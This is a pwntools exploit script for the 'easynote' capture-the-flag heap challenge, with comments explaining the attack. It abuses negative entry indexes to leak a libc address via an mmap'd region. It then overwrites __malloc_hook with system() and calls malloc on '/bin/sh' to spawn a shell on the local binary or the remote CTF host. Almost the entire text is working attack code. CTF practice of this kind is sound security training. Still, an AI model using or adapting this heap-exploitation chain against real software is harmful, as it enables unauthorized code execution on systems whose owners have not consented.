from pwn import *
context.log_level='debug'

# read and edit in the binary have a vulnerability:
# they can take in negative indexes

# edit also doesnt malloc() if the entry is non-null
# Thus, we can modify the contents of the note after #i
# using edit(#i, -1, 'stuff')

# and also read the contents of a note (including the address
# of the next note) using read(#i, -1)


# The structure of the note is as follows:
# +----------+----------+----------+----------+ ...
# |   size   | next ptr |entry_ptr0|entry_ptr1| ...
# +----------+----------+----------+----------+ ...
# Entry indexes:
#     -2          -1          0         1       ...

libc_path = './easynote_libc-2.26.so'
libc = ELF(libc_path)
if args['R']=='1':
    p = remote('ctf.pwn.sg', 1700)
else:
    p = process('./easynote', env = {'LD_PRELOAD': os.path.join(os.getcwd(), libc_path)})

def create(sz):
    p.sendlineafter('Choice: ', '0')
    p.sendlineafter('Entries: ', ' '+str(sz))

def delete(sz):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('Notebook index: ', ' '+str(sz))

def read(nidx, eidx):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('Notebook index: ', ' '+str(nidx))
    p.sendlineafter('Entry index: ', ' '+str(eidx))
    return p.recvline()

def edit(nidx, eidx, content):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('Notebook index: ', ' '+str(nidx))
    p.sendlineafter('Entry index: ', ' '+str(eidx))
    p.sendlineafter('Enter contents: ', content)

# If we create a large amount of memory, malloc() 
# will call mmap(), and a new region of valid memory
# will be used as a 'extra heap'
# This region of memory is actually RIGHT before libc!
# (0x42200 before libc)

# The idea is to read where libc is, then overwrite function pointers
# such as __malloc_hook or __free_hook to system() so that malloc/free
# becomes system()

# create large amt of memory
# this actually allocats the note at the new extra heap,
# somewhere around the upper half of the new extra heap
# index #0
create(0x210000/8)
# fill up the original heap so that the next create() will
# ask from the extra heap
# index #1
create(16800)
# at -1 of index #0 is the pointer to index #1
# so we overwrite the `size` field of index #1
# to 'a'*8, so that when we read(0, -1), we can
# read 'aaaaaaaa'+(ptr to index #2)
edit(0, -1,'a'*8)
# create index #2
create(0x210000/8)
# now leak the address of index #2
# this is the address of the start of the extra heap + 0x10
leak = u64(read(0, -1)[8:-1].ljust(8,'\x00'))
# libc is a constant (0x422000) from the extra heap
libc_base=leak-0x10+0x422000

# woops hardcoded
__malloc_hook = libc_base + 0x003dac10
system = libc_base + 294336

print(hex(libc_base))

# Now we set index #2's size to 'a'*8 and its 'next ptr' to __malloc_hook
edit(1, -1, 'a'*8 + p64(__malloc_hook))
# Overwrite the function pointer at __malloc_hook with system
# Now when __malloc_hook is called is calls system
edit(2, -1, p64(system))

#success('PID: %s'%p.pid)
pause()

# libc_base+1720096 is the address to /bin/sh
# we are basically calling malloc("/bin/sh")
# which calls __malloc_hook("/bin/sh", some bs ....)
# which is actually system("/bin/sh")
create((libc_base+1720096)/8-2)

p.interactive()
